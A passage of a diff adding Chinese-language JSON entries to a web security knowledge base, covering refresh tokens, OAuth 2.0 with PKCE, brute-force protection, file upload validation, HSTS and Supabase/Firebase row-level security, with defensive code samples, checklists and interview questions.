+    "cons": "并发刷新需处理竞态",
+    "when": "浏览器与移动端公共客户端"
+   },
+   {
+    "opt": "不轮换的长期刷新令牌",
+    "pros": "实现简单",
+    "cons": "被盗后长期可用",
+    "when": "安全存储的机密客户端"
+   },
+   {
+    "opt": "发送者约束令牌",
+    "pros": "令牌被盗也难以使用",
+    "cons": "实现复杂，支持有限",
+    "when": "金融等高安全场景"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "刷新令牌明文存于数据库",
+    "fix": "只存哈希值，比对时哈希后查询"
+   },
+   {
+    "bad": "浏览器中把刷新令牌放 localStorage",
+    "fix": "用 HttpOnly、Secure Cookie 或 BFF 模式在服务端保管"
+   },
+   {
+    "bad": "多个标签页并发刷新触发误判重用",
+    "fix": "客户端串行刷新，或服务端设置短暂宽限期"
+   },
+   {
+    "bad": "用户改密、登出后刷新令牌仍有效",
+    "fix": "这些事件触发时吊销该用户全部刷新令牌"
+   }
+  ],
+  "checklist": [
+   "刷新令牌只发往令牌端点",
+   "服务端只存哈希",
+   "公共客户端启用轮换与重用检测",
+   "设置绝对过期上限",
+   "登出、改密时批量吊销",
+   "浏览器端不暴露给 JavaScript"
+  ],
+  "interview": [
+   {
+    "q": "为什么需要刷新令牌，而不是直接用长期访问令牌？",
+    "a": "访问令牌频繁发送给各资源服务器，暴露面大，且通常无状态难以撤销，所以应短命。刷新令牌只发往授权服务器、可在服务端吊销，保护更集中。两者组合既缩小了泄露窗口，又避免用户频繁重新登录。"
+   },
+   {
+    "q": "刷新令牌轮换如何发现令牌被盗？",
+    "a": "每个刷新令牌只能使用一次。若攻击者和合法用户先后使用同一个令牌，第二次使用的必定是已作废的令牌，服务器据此判定泄露，吊销整个令牌族，双方都需重新登录，攻击者因此失去访问权。"
+   },
+   {
+    "q": "SPA 应该如何保存刷新令牌？",
+    "a": "浏览器环境中任何 JS 可读的存储都可能被 XSS 窃取。推荐 BFF（Backend for Frontend）模式，由同域后端保管令牌，前端只持有 HttpOnly 会话 Cookie；若必须在前端处理，则启用轮换并设置较短的绝对有效期。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "RFC 6749 Section 1.5: Refresh Token",
+    "url": "https://www.rfc-editor.org/rfc/rfc6749#section-1.5"
+   },
+   {
+    "title": "RFC 9700: OAuth 2.0 Security Best Current Practice",
+    "url": "https://www.rfc-editor.org/rfc/rfc9700"
+   },
+   {
+    "title": "Auth0 Docs: Refresh Token Rotation",
+    "url": "https://auth0.com/docs/secure/tokens/refresh-tokens/refresh-token-rotation"
+   }
+  ]
+ },
+ {
+  "slug": "oauth-2-0",
+  "def": "OAuth 2.0 是 RFC 6749 定义的授权框架，让用户在不交出密码的前提下，授权第三方应用以受限范围（scope）访问其在另一服务上的资源。它定义了资源所有者、客户端、授权服务器、资源服务器四种角色和多种授权流程。它本身不是认证协议，登录场景应使用其上的 OpenID Connect。",
+  "how": [
+   "客户端把用户重定向到授权服务器，携带 client_id、redirect_uri、scope、state 和 PKCE 的 code_challenge。",
+   "用户在授权服务器登录并同意授权，授权服务器带着一次性授权码重定向回 redirect_uri。",
+   "客户端校验 state 后，用授权码和 code_verifier（机密客户端另加凭证）向令牌端点换取访问令牌。",
+   "客户端携带访问令牌调用资源服务器，资源服务器校验令牌及其 scope 后返回数据。",
+   "访问令牌过期后，客户端用刷新令牌换取新令牌，无需用户再次授权。"
+  ],
+  "terms": [
+   {
+    "t": "授权码流程 (Authorization Code)",
+    "d": "用一次性授权码换令牌的主流流程，应配合 PKCE。"
+   },
+   {
+    "t": "PKCE",
+    "d": "RFC 7636，用 verifier/challenge 对防止授权码被截获滥用。"
+   },
+   {
+    "t": "Scope",
+    "d": "访问令牌被授予的权限范围，如只读邮箱。"
+   },
+   {
+    "t": "state 参数",
+    "d": "随机值，用于防止授权回调的 CSRF 攻击。"
+   },
+   {
+    "t": "客户端凭证流程 (Client Credentials)",
+    "d": "无用户参与、服务间调用使用的流程。"
+   }
+  ],
+  "code": {
+   "lang": "http",
+   "title": "授权码 + PKCE 流程",
+   "src": "# 1. 浏览器跳转到授权端点（code_challenge = BASE64URL(SHA256(code_verifier))）\nGET /authorize?response_type=code&client_id=my-app\n    &redirect_uri=https%3A%2F%2Fapp.example.com%2Fcallback\n    &scope=openid%20profile%20email&state=Xy7k2Q\n    &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM\n    &code_challenge_method=S256 HTTP/1.1\nHost: auth.example.com\n\n# 2. 用户同意后，回调到 redirect_uri（客户端需校验 state）\n# https://app.example.com/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=Xy7k2Q\n\n# 3. 后端用授权码 + code_verifier 换令牌\nPOST /token HTTP/1.1\nHost: auth.example.com\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=authorization_code&code=SplxlOBeZQQYbYS6WxSbIA\n&redirect_uri=https%3A%2F%2Fapp.example.com%2Fcallback\n&client_id=my-app&code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk",
+   "note": "示例取值来自 RFC 7636 与 RFC 6749 附录；URL 中换行仅为排版，实际为单行。"
+  },
+  "table": {
+   "title": "授权流程选择",
+   "head": [
+    "流程",
+    "适用客户端",
+    "状态"
+   ],
+   "rows": [
+    [
+     "授权码 + PKCE",
+     "Web、SPA、移动端",
+     "推荐"
+    ],
+    [
+     "客户端凭证",
+     "服务对服务",
+     "推荐（无用户场景）"
+    ],
+    [
+     "设备授权",
+     "电视、CLI 等输入受限设备",
+     "推荐（RFC 8628）"
+    ],
+    [
+     "隐式流程/密码流程",
+     "历史方案",
+     "安全最佳实践不再推荐"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "接入现成身份提供商",
+    "pros": "安全实现成熟，省时",
+    "cons": "依赖第三方与费用",
+    "when": "绝大多数应用"
+   },
+   {
+    "opt": "自建授权服务器",
+    "pros": "完全可控",
+    "cons": "实现复杂、易出安全漏洞",
+    "when": "平台型产品，需对外开放 API"
+   },
+   {
+    "opt": "BFF 模式处理令牌",
+    "pros": "浏览器不接触令牌",
+    "cons": "需要服务端组件",
+    "when": "安全要求高的 SPA"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "用 OAuth 访问令牌判断“用户是谁”",
+    "fix": "登录使用 OpenID Connect，校验 ID Token 的 iss、aud"
+   },
+   {
+    "bad": "redirect_uri 使用通配符或前缀匹配",
+    "fix": "授权服务器精确匹配预注册的回调地址"
+   },
+   {
+    "bad": "不校验 state，或公共客户端不用 PKCE",
+    "fix": "始终使用 PKCE，并校验 state"
+   },
+   {
+    "bad": "申请远超需要的 scope",
+    "fix": "按最小权限申请，按需增量授权"
+   }
+  ],
+  "checklist": [
+   "使用授权码 + PKCE",
+   "redirect_uri 精确注册与匹配",
+   "校验 state 防 CSRF",
+   "scope 最小化",
+   "客户端密钥只在服务端",
+   "登录场景使用 OIDC 并校验 ID Token"
+  ],
+  "interview": [
+   {
+    "q": "OAuth 2.0 和 OpenID Connect 的区别？",
+    "a": "OAuth 2.0 解决授权：客户端获得访问某资源的令牌，令牌不保证能说明用户身份。OIDC 在 OAuth 2.0 之上增加 ID Token（JWT）、标准声明和 UserInfo 端点，专门解决认证，告诉客户端是谁、何时、如何登录。"
+   },
+   {
+    "q": "PKCE 解决了什么问题？",
+    "a": "公共客户端（移动应用、SPA）无法安全保存 client_secret，授权码在回调时可能被恶意应用或日志截获。PKCE 让客户端先发送 verifier 的哈希，换令牌时提交原始 verifier，截获授权码的攻击者没有 verifier 就无法换取令牌。"
+   },
+   {
+    "q": "为什么隐式流程被弃用？",
+    "a": "隐式流程把访问令牌直接放在重定向 URL 的片段中返回，可能通过浏览器历史、Referer、恶意脚本泄露，且无法使用刷新令牌和发送者约束。随着浏览器普遍支持 CORS，授权码 + PKCE 可以安全替代它。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "RFC 6749: The OAuth 2.0 Authorization Framework",
+    "url": "https://www.rfc-editor.org/rfc/rfc6749"
+   },
+   {
+    "title": "RFC 7636: PKCE",
+    "url": "https://www.rfc-editor.org/rfc/rfc7636"
+   },
+   {
+    "title": "RFC 9700: OAuth 2.0 Security Best Current Practice",
+    "url": "https://www.rfc-editor.org/rfc/rfc9700"
+   },
+   {
+    "title": "oauth.net: OAuth 2.0",
+    "url": "https://oauth.net/2/"
+   }
+  ]
+ },
+ {
+  "slug": "brute-force-protection",
+  "def": "暴力破解防护（Brute Force Protection）是一组防止攻击者通过大量尝试猜中密码、验证码或令牌的机制，包括限流、渐进延迟、账号锁定、验证码挑战和多因素认证。它属于认证安全层，需同时应对针对单账号的猜测、跨账号的密码喷洒和使用泄露凭证的撞库攻击。",
+  "how": [
+   "按多个维度计数失败尝试：用户名、IP、设备指纹、IP+用户名组合。",
+   "超过阈值时逐步升级响应：增加延迟、要求验证码、临时锁定或要求额外验证。",
+   "对短数字验证码、重置令牌等低熵凭证设置严格的尝试上限和有效期。",
+   "检测密码喷洒与撞库：同一 IP 尝试大量账号、或大量来源使用已泄露凭证。",
+   "提供 MFA，并对异常登录通知用户，使猜中密码也不足以接管账号。"
+  ],
+  "terms": [
+   {
+    "t": "撞库 (Credential Stuffing)",
+    "d": "用其他网站泄露的用户名密码对批量尝试登录。"
+   },
+   {
+    "t": "密码喷洒 (Password Spraying)",
+    "d": "用少数常见密码尝试大量账号，避开单账号锁定。"
+   },
+   {
+    "t": "限流 (Rate Limiting)",
+    "d": "限制单位时间内的请求次数，超出返回 429。"
+   },
+   {
+    "t": "账号锁定 (Account Lockout)",
+    "d": "失败次数过多后暂时禁止登录，可能被滥用为 DoS。"
+   },
+   {
+    "t": "令牌桶 (Token Bucket)",
+    "d": "常用限流算法，允许一定突发并按固定速率恢复。"
+   }
+  ],
+  "code": {
+   "lang": "javascript",
+   "title": "Express 登录接口限流",
+   "src": "import express from \"express\";\nimport { rateLimit } from \"express-rate-limit\";\n\nconst app = express();\napp.use(express.json());\n\n// 按 IP + 用户名组合限流，兼顾单账号猜测与共享出口 IP\nconst loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,      // 15 分钟窗口\n  limit: 5,                      // 每个键最多 5 次\n  standardHeaders: \"draft-7\",    // 返回 RateLimit 相关响应头\n  legacyHeaders: false,\n  keyGenerator: (req) => `${req.ip}:${String(req.body?.email).toLowerCase()}`,\n  skipSuccessfulRequests: true,  // 成功登录不计数\n  message: { error: \"尝试过于频繁，请稍后再试\" },\n});\n\napp.post(\"/login\", loginLimiter, async (req, res) => {\n  // ...校验密码；失败时返回统一提示，不区分用户名或密码错误\n  res.status(401).json({ error: \"邮箱或密码错误\" });\n});",
+   "note": "多实例部署需配置共享存储（如 Redis store）；IPv6 等场景需按文档处理键生成。"
+  },
+  "table": {
+   "title": "防护手段对比",
+   "head": [
+    "手段",
+    "防什么",
+    "副作用"
+   ],
+   "rows": [
+    [
+     "IP 限流",
+     "单源大量尝试",
+     "共享 IP 用户受影响，分布式攻击可绕过"
+    ],
+    [
+     "账号锁定",
+     "单账号猜测",
+     "攻击者可故意锁定他人账号"
+    ],
+    [
+     "验证码挑战",
+     "自动化脚本",
+     "影响体验，可被打码服务绕过"
+    ],
+    [
+     "MFA",
+     "密码泄露后的接管",
+     "增加登录步骤"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "硬锁定账号",
+    "pros": "彻底阻断单账号猜测",
+    "cons": "可被用作拒绝服务",
+    "when": "高价值账号，配合解锁流程"
+   },
+   {
+    "opt": "渐进延迟 + 验证码",
+    "pros": "不影响正常用户登录",
+    "cons": "实现更复杂",
+    "when": "大多数面向公众的登录"
+   },
+   {
+    "opt": "无密码/通行密钥",
+    "pros": "从根本上消除密码猜测",
+    "cons": "迁移成本与兼容性",
+    "when": "新产品或安全升级"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "登录提示区分“用户不存在”和“密码错误”",
+    "fix": "统一失败提示，注册和找回流程同样避免泄露"
+   },
+   {
+    "bad": "只限流登录，忘了短信验证码和重置接口",
+    "fix": "所有验证凭证的接口都限次数和有效期"
+   },
+   {
+    "bad": "限流计数存在单实例内存中",
+    "fix": "多实例部署使用 Redis 等共享存储"
+   },
+   {
+    "bad": "信任 X-Forwarded-For 任意值作为 IP",
+    "fix": "正确配置可信代理，只取可信跳数"
+   }
+  ],
+  "checklist": [
+   "登录、验证码、重置接口均有限流",
+   "失败提示不暴露账号是否存在",
+   "限流计数跨实例共享",
+   "支持并鼓励 MFA",
+   "检测撞库与喷洒模式",
+   "异常登录通知用户"
+  ],
+  "interview": [
+   {
+    "q": "为什么只按 IP 限流不够？",
+    "a": "攻击者可使用代理池和僵尸网络，从大量 IP 分散尝试，每个 IP 都在阈值以下；同时大量正常用户可能共享一个出口 IP 而被误伤。需要组合用户名维度、IP+用户名维度、全局异常检测和验证码挑战。"
+   },
+   {
+    "q": "账号锁定有什么风险？",
+    "a": "攻击者知道用户名就能故意输错密码，把目标用户锁在外面，形成拒绝服务。缓解方式是使用临时锁定和渐进延迟而非永久锁定，锁定后提供验证码或邮件解锁，并结合设备识别让已知设备不受影响。"
+   },
+   {
+    "q": "如何防御撞库攻击？",
+    "a": "撞库使用的是真实有效的密码，单账号可能只尝试一次，限流难以奏效。对策包括 MFA、检测已泄露密码并拒绝使用、识别自动化流量（设备指纹、行为分析）、异常登录二次验证，以及新设备登录通知。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "OWASP Authentication Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+   },
+   {
+    "title": "OWASP Credential Stuffing Prevention Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html"
+   },
+   {
+    "title": "NIST SP 800-63B: Digital Identity Guidelines",
+    "url": "https://pages.nist.gov/800-63-3/sp800-63b.html"
+   },
+   {
+    "title": "express-rate-limit (GitHub)",
+    "url": "https://github.com/express-rate-limit/express-rate-limit"
+   }
+  ]
+ },
+ {
+  "slug": "file-upload-validation",
+  "def": "文件上传验证（File Upload Validation）是在服务端对用户上传文件的类型、内容、大小、名称和存储方式进行多层校验与处置的安全实践。上传功能可能导致远程代码执行、存储型 XSS、路径穿越、恶意软件分发和资源耗尽，因此不能只依赖前端限制或客户端声明的 Content-Type。",
+  "how": [
+   "在网关与应用层同时限制请求体大小和单次文件数量，防止资源耗尽。",
+   "用扩展名白名单校验，并读取文件头魔数（Magic Bytes）确认真实类型。",
+   "丢弃用户提供的文件名，由服务端生成随机名称，防止路径穿越和覆盖。",
+   "存储在 Web 根目录之外或对象存储中，不赋予执行权限，下载时设置正确的 Content-Type 与 Content-Disposition。",
+   "对图片重新编码以去除嵌入内容，必要时进行病毒扫描，并对 SVG、HTML 等可执行内容特殊处理。"
+  ],
+  "terms": [
+   {
+    "t": "魔数 (Magic Bytes)",
+    "d": "文件开头标识格式的固定字节，如 PNG 以 89 50 4E 47 开头。"
+   },
+   {
+    "t": "路径穿越 (Path Traversal)",
+    "d": "利用 ../ 等在文件名中跳出目标目录。"
+   },
+   {
+    "t": "Content-Disposition: attachment",
+    "d": "强制浏览器下载而非内联渲染文件。"
+   },
+   {
+    "t": "预签名 URL (Presigned URL)",
+    "d": "限时限权的上传或下载地址，让客户端直传对象存储。"
+   },
+   {
+    "t": "多语言文件 (Polyglot File)",
+    "d": "同时是多种合法格式的文件，可绕过单一检查。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "FastAPI 上传多层校验",
+   "src": "import uuid\nfrom pathlib import Path\nfrom fastapi import FastAPI, UploadFile, HTTPException\n\napp = FastAPI()\nUPLOAD_DIR = Path(\"/srv/uploads\")          # Web 根目录之外\nMAX_BYTES = 5 * 1024 * 1024\nSIGNATURES = {b\"\\x89PNG\\r\\n\\x1a\\n\": \".png\", b\"\\xff\\xd8\\xff\": \".jpg\",\n              b\"%PDF-\": \".pdf\"}\n\n@app.post(\"/upload\")\nasync def upload(file: UploadFile):\n    data = await file.read(MAX_BYTES + 1)\n    if len(data) > MAX_BYTES:\n        raise HTTPException(413, \"文件过大\")\n    # 按魔数判断真实类型，不信任文件名与 Content-Type\n    ext = next((e for sig, e in SIGNATURES.items() if data.startswith(sig)), None)\n    if ext is None:\n        raise HTTPException(415, \"不支持的文件类型\")\n    name = f\"{uuid.uuid4().hex}{ext}\"       # 服务端生成文件名\n    (UPLOAD_DIR / name).write_bytes(data)\n    return {\"id\": name}",
+   "note": "演示大小、魔数、重命名、隔离存储四层；生产还应加病毒扫描并考虑图片重编码。"
+  },
+  "table": {
+   "title": "上传风险与对策",
+   "head": [
+    "风险",
+    "攻击方式",
+    "对策"
+   ],
+   "rows": [
+    [
+     "远程代码执行",
+     "上传 .php 等脚本并访问执行",
+     "白名单、存储不可执行"
+    ],
+    [
+     "存储型 XSS",
+     "上传 HTML/SVG 被同域渲染",
+     "独立域名托管、attachment 下载"
+    ],
+    [
+     "路径穿越",
+     "文件名含 ../",
+     "服务端生成文件名"
+    ],
+    [
+     "资源耗尽",
+     "超大文件或解压炸弹",
+     "大小限制、解压前检查"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "客户端直传对象存储",
+    "pros": "减轻服务器负载",
+    "cons": "校验需在上传后异步进行",
+    "when": "大文件、高并发上传"
+   },
+   {
+    "opt": "经服务器中转校验",
+    "pros": "落盘前完成校验",
+    "cons": "占用带宽和内存",
+    "when": "小文件、强校验需求"
+   },
+   {
+    "opt": "独立域名托管用户文件",
+    "pros": "隔离 Cookie 与同源风险",
+    "cons": "需额外域名配置",
+    "when": "允许用户上传可渲染内容"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "只检查客户端传来的 Content-Type",
+    "fix": "该值由客户端控制，需读取文件内容判断"
+   },
+   {
+    "bad": "扩展名黑名单拦截 .php",
+    "fix": "使用白名单，黑名单易被 .phtml 等变体绕过"
+   },
+   {
+    "bad": "直接使用用户上传的原始文件名保存",
+    "fix": "生成随机文件名，原名仅作元数据并转义展示"
+   },
+   {
+    "bad": "允许上传 SVG 并在主域名内联展示",
+    "fix": "SVG 可含脚本，需清洗或作为附件下载"
+   }
+  ],
+  "checklist": [
+   "服务端限制文件大小与数量",
+   "扩展名白名单 + 魔数校验",
+   "服务端生成文件名",
+   "存储位置不可执行、不在 Web 根",
+   "下载响应设置 nosniff 与合适的 Disposition",
+   "高风险场景接入病毒扫描"
+  ],
+  "interview": [
+   {
+    "q": "为什么不能只靠扩展名或 Content-Type？",
+    "a": "两者都由客户端决定，攻击者可以随意伪造。扩展名白名单仍是必要的一层，但必须结合文件内容的魔数检测；对于图片等格式，重新解码再编码能进一步去除隐藏的恶意载荷。"
+   },
+   {
+    "q": "用户上传的文件为什么建议放在独立域名？",
+    "a": "如果用户上传的 HTML、SVG 在主域名下被浏览器渲染，其中的脚本就会以主站身份执行，能访问主站 Cookie 和接口，形成存储型 XSS。使用独立域名（不共享 Cookie 的源）托管，可把这种风险隔离出去。"
+   },
+   {
+    "q": "直传对象存储时如何校验？",
+    "a": "后端签发限定路径、大小、类型和有效期的预签名 URL；文件先上传到隔离区，由事件触发的后台任务检查魔数、扫描病毒、处理图片，通过后再移到正式位置并标记可用，未通过则删除。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "OWASP File Upload Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+   },
+   {
+    "title": "CWE-434: Unrestricted Upload of File with Dangerous Type",
+    "url": "https://cwe.mitre.org/data/definitions/434.html"
+   },
+   {
+    "title": "MDN: Content-Disposition",
+    "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition"
+   }
+  ]
+ },
+ {
+  "slug": "hsts",
+  "def": "HTTP 严格传输安全（HTTP Strict Transport Security，HSTS）是 RFC 6797 定义的机制：服务器用 Strict-Transport-Security 响应头告诉浏览器在指定时间内只用 HTTPS 访问该域名。可防御 SSL 剥离等降级攻击，并禁止用户跳过证书错误。",
+  "how": [
+   "浏览器通过 HTTPS 访问网站，收到 Strict-Transport-Security 响应头；通过 HTTP 收到的该头会被忽略。",
+   "浏览器记录该域名为 HSTS 主机，有效期为 max-age 秒，可选 includeSubDomains 覆盖所有子域。",
+   "有效期内，用户输入 http:// 或点击 HTTP 链接，浏览器在本地直接改写为 https://，不发出明文请求。",
+   "若 HTTPS 证书无效，浏览器直接阻断，不提供“继续访问”的选项。",
+   "首次访问前仍有窗口期，可申请加入浏览器内置的 HSTS 预加载列表来消除。"
+  ],
+  "terms": [
+   {
+    "t": "max-age",
+    "d": "浏览器记住只用 HTTPS 的秒数，设为 0 表示删除该策略。"
+   },
+   {
+    "t": "includeSubDomains",
+    "d": "策略同时适用于所有子域名。"
+   },
+   {
+    "t": "preload",
+    "d": "表示同意加入浏览器预加载列表，需另行到 hstspreload.org 提交。"
+   },
+   {
+    "t": "SSL 剥离 (SSL Stripping)",
+    "d": "中间人把 HTTPS 链接降级为 HTTP 以窃听或篡改。"
+   },
+   {
+    "t": "首次访问信任 (TOFU)",
+    "d": "HSTS 依赖首次 HTTPS 响应，首访前无保护。"
+   }
+  ],
+  "code": {
+   "lang": "text",
+   "title": "Nginx 配置 HSTS",
+   "src": "server {\n    listen 80;\n    server_name example.com www.example.com;\n    return 301 https://$host$request_uri;      # 先把 HTTP 跳转到 HTTPS\n}\n\nserver {\n    listen 443 ssl;\n    server_name example.com www.example.com;\n    ssl_certificate     /etc/letsencrypt/live/example.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;\n\n    # 先用较短 max-age 验证，确认所有子域都支持 HTTPS 后再加长\n    add_header Strict-Transport-Security \"max-age=300; includeSubDomains\" always;\n\n    # 稳定后的目标配置（加入预加载列表的要求之一是 max-age 至少一年）\n    # add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n}",
+   "note": "always 让错误响应也带上该头；推荐从短 max-age 逐步提高，降低误配风险。"
+  },
+  "table": {
+   "title": "HSTS 推进阶段",
+   "head": [
+    "阶段",
+    "配置",
+    "目的"
+   ],
+   "rows": [
+    [
+     "试运行",
+     "max-age=300",
+     "发现不支持 HTTPS 的子域"
+    ],
+    [
+     "扩大",
+     "max-age 逐步提高到一周、一个月",
+     "观察兼容问题"
+    ],
+    [
+     "稳定",
+     "max-age=31536000; includeSubDomains",
+     "长期强制 HTTPS"
+    ],
+    [
+     "预加载",
+     "追加 preload 并提交列表",
+     "消除首访窗口"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "仅 HTTP→HTTPS 跳转",
+    "pros": "简单",
+    "cons": "首个明文请求可被劫持",
+    "when": "过渡期"
+   },
+   {
+    "opt": "HSTS + 长 max-age",
+    "pros": "有效防降级",
+    "cons": "首访前仍有窗口",
+    "when": "所有正式 HTTPS 站点"
+   },
+   {
+    "opt": "加入预加载列表",
+    "pros": "首访即受保护",
+    "cons": "移除缓慢，误配代价高",
+    "when": "确认全域长期支持 HTTPS"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "一上来就设一年 max-age 加 includeSubDomains",
+    "fix": "先短期验证所有子域支持 HTTPS，再逐步加长"
+   },
+   {
+    "bad": "内网或旧系统子域只支持 HTTP 却被覆盖",
+    "fix": "排查全部子域，或暂不启用 includeSubDomains"
+   },
+   {
+    "bad": "以为加了 preload 指令就已进入列表",
+    "fix": "需到 hstspreload.org 提交并满足全部要求"
+   },
+   {
+    "bad": "在 HTTP 响应中下发 HSTS 头",
+    "fix": "浏览器只认 HTTPS 响应中的 HSTS 头"
+   }
+  ],
+  "checklist": [
+   "HTTP 全部 301 跳转到 HTTPS",
+   "所有子域确认支持 HTTPS",
+   "HSTS 头通过 HTTPS 下发",
+   "max-age 按阶段提升",
+   "证书自动续期且有监控",
+   "评估是否适合加入预加载"
+  ],
+  "interview": [
+   {
+    "q": "已经有 HTTP 到 HTTPS 的 301 跳转，为什么还要 HSTS？",
+    "a": "跳转发生前，用户的首个请求仍是明文 HTTP，中间人可拦截并阻止跳转，把用户留在 HTTP 上（SSL 剥离）。HSTS 让浏览器在本地把后续请求直接改写为 HTTPS，不再发出明文请求，从而堵住这个窗口。"
+   },
+   {
+    "q": "HSTS 预加载有什么风险？",
+    "a": "预加载列表硬编码在浏览器中，域名及其全部子域将被强制 HTTPS。若之后某个子域需要 HTTP，或想撤出列表，移除需要随浏览器版本更新逐步生效，周期较长。因此只有在确定长期全域 HTTPS 时才应申请。"
+   },
+   {
+    "q": "HSTS 如何影响证书错误处理？",
+    "a": "对 HSTS 主机，证书无效时浏览器会硬性阻断，用户无法点击继续访问。这能防止用户被训练成忽略警告，但也意味着证书过期会让网站对所有用户直接不可用，所以必须配合可靠的自动续期和监控。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "RFC 6797: HTTP Strict Transport Security",
+    "url": "https://www.rfc-editor.org/rfc/rfc6797"
+   },
+   {
+    "title": "MDN: Strict-Transport-Security",
+    "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security"
+   },
+   {
+    "title": "HSTS Preload List Submission",
+    "url": "https://hstspreload.org/"
+   }
+  ]
+ },
+ {
+  "slug": "backend-as-a-service",
+  "def": "后端即服务（Backend as a Service，BaaS）是把数据库、认证、文件存储、实时订阅和函数等常见后端能力打包成托管服务，前端通过 SDK 直接调用的模式，代表产品有 Supabase、Firebase。它能大幅缩短开发时间，但安全模型转移到数据库规则上：客户端密钥是公开的，权限全靠服务端规则保证。",
+  "how": [
+   "在控制台创建项目，获得项目 URL 和可公开的客户端密钥（Supabase 的 anon/publishable key、Firebase 配置）。",
+   "前端通过 SDK 直接读写数据、调用认证接口，SDK 自动附带当前用户的身份令牌。",
+   "服务端依据访问规则判定请求：Supabase 使用 PostgreSQL 行级安全，Firebase 使用 Security Rules。",
+   "需要保密逻辑或第三方密钥时，放在边缘函数或云函数中执行，使用服务端密钥。",
+   "平台托管扩缩容、备份和监控，开发者通过迁移、规则文件管理变更。"
+  ],
+  "terms": [
+   {
+    "t": "Supabase",
+    "d": "以 PostgreSQL 为核心的开源 BaaS，提供认证、存储、实时和边缘函数。"
+   },
+   {
+    "t": "Firebase",
+    "d": "Google 的 BaaS，数据库有 Firestore 与 Realtime Database。"
+   },
+   {
+    "t": "行级安全 (RLS)",
+    "d": "按策略限制用户可访问的行，Supabase 的核心授权机制。"
+   },
+   {
+    "t": "service_role key",
+    "d": "Supabase 绕过 RLS 的服务端密钥，绝不能暴露到客户端。"
+   },
+   {
+    "t": "Security Rules",
+    "d": "Firebase 的声明式访问规则，控制客户端读写。"
+   }
+  ],
+  "code": {
+   "lang": "sql",
+   "title": "Supabase 表启用 RLS",
+   "src": "-- 建表：每条待办属于一个用户\ncreate table public.todos (\n  id bigint generated always as identity primary key,\n  user_id uuid not null references auth.users(id) default auth.uid(),\n  title text not null,\n  done boolean not null default false\n);\n\n-- 启用行级安全：未写策略前，客户端默认无任何访问权\nalter table public.todos enable row level security;\n\n-- 只能读、写自己的行\ncreate policy \"read own todos\" on public.todos\n  for select to authenticated using ((select auth.uid()) = user_id);\n\ncreate policy \"insert own todos\" on public.todos\n  for insert to authenticated with check ((select auth.uid()) = user_id);\n\n-- 前端：await supabase.from('todos').select('*') 只会返回当前用户的行",
+   "note": "RLS 是用公开密钥直连数据库时的安全边界；(select auth.uid()) 写法为官方性能建议。"
+  },
+  "table": {
+   "title": "两大 BaaS 对比",
+   "head": [
+    "维度",
+    "Supabase",
+    "Firebase"
+   ],
+   "rows": [
+    [
+     "数据库",
+     "PostgreSQL（关系型、SQL）",
+     "Firestore（文档型 NoSQL）"
+    ],
+    [
+     "授权机制",
+     "行级安全策略",
+     "Security Rules"
+    ],
+    [
+     "开源与自托管",
+     "开源，可自托管",
+     "闭源托管服务"
+    ],
+    [
+     "适合",
+     "关系数据、需要 SQL",
+     "移动端、实时同步、Google 生态"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "BaaS",
+    "pros": "上线快，运维少",
+    "cons": "规则复杂度与平台锁定",
+    "when": "MVP、小团队、AI 快速构建应用"
+   },
+   {
+    "opt": "自建后端 API",
+    "pros": "业务逻辑完全可控",
+    "cons": "开发运维成本高",
+    "when": "复杂业务、强合规要求"
+   },
+   {
+    "opt": "BaaS + 自有函数",
+    "pros": "兼顾速度与灵活",
+    "cons": "架构分散",
+    "when": "需要支付、第三方集成等私密逻辑"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "表未启用 RLS，任何人用公开密钥可读写",
+    "fix": "所有暴露的表启用 RLS 并编写最小策略"
+   },
+   {
+    "bad": "把 service_role key 写进前端或提交仓库",
+    "fix": "仅在服务端函数中使用，泄露立即轮换"
+   },
+   {
+    "bad": "Firebase 规则保持测试模式全开放",
+    "fix": "上线前改为基于 request.auth 的规则并测试"
+   },
+   {
+    "bad": "AI 生成的 Supabase 代码只写查询不写策略",
+    "fix": "要求同时生成 RLS 策略，并用不同账号验证"
+   }
+  ],
+  "checklist": [
+   "所有表启用 RLS 或安全规则",
+   "服务端密钥只在后端使用",
+   "策略经多账号测试验证",
+   "数据库变更使用迁移管理",
+   "开启备份并了解恢复流程",
+   "关注用量与计费上限"
+  ],
+  "interview": [
+   {
+    "q": "BaaS 的公开密钥泄露了怎么办？",
+    "a": "Supabase 的 anon/publishable key 和 Firebase 配置本就设计为公开，只标识项目，不代表权限。真正的安全来自 RLS 或 Security Rules。需要保密的是 service_role 等服务端密钥，泄露必须立即轮换。"
+   },
+   {
+    "q": "什么时候不适合用 BaaS？",
